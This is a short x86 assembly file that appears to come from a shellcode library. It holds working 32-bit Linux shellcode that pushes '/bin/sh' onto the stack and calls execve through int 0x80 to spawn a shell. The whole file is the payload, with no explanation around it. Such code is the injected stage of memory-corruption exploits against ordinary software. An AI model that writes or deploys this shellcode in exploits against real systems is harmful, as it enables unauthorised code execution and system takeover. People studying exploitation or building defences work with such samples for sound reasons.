bits 32
%include "include/all.asm"

start_listing:
    push `/sh\0`
    push '/bin'

    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, SYS_execve
    int 0x80
